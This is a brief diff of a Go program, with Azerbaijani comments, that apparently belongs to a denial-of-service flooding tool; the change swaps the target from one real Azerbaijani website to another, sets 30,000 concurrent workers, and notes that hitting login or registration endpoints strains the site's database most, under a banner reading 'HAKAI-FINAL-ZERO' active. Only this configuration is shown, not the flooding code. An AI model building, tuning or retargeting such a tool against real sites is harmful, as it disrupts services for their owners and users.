@@ -12,7 +12,7 @@ import (
 
 func main() {
     // Hədəf endpoint - qeydiyyat və ya giriş hissəsi bazanı daha çox yorur
-	target := "https://azpul.az" 
+	target := "https://turbo.az" 
 	workers := 30000 // Railway gücünü sona qədər istifadə edirik
 	
 	fmt.Printf("[!!!] HAKAI-FINAL-ZERO DEVRƏDƏ: %s\n", target)
